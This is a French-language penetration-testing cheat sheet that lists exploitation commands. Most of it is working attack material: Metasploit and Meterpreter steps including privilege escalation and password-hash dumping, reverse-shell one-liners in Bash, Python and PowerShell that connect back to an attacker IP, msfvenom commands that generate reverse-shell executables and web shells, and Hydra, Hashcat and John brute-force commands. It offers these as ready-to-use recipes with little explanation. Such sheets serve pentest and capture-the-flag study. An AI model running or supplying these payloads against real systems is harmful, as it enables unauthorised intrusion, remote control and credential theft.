# Exploitation

## Metasploit

```bash
msfconsole
search exploit_name
use exploit/path
show options
set RHOSTS IP
set LHOST IP_ATTAQUANT
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### Meterpreter utile

```bash
sysinfo
getuid
getsystem               # Tenter privesc
hashdump                 # Dump des hashes
upload fichier
download fichier
shell                    # Shell systeme
migrate PID              # Migrer vers un autre processus
```

## Reverse shells

### Listeners

```bash
# Netcat
nc -lvnp 4444

# Metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST IP
set LPORT 4444
run
```

### Payloads courants

```bash
# Bash
bash -i >& /dev/tcp/IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

### Generer des payloads avec msfvenom

```bash
# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -o shell.php

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war
```

## Ameliorer un shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Brute force

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l user -P wordlist ssh://IP

# Hashcat
hashcat -m 0 hash.txt wordlist.txt         # MD5
hashcat -m 1000 hash.txt wordlist.txt      # NTLM
hashcat -m 1800 hash.txt wordlist.txt      # sha512crypt

# John
john --wordlist=rockyou.txt hash.txt
```
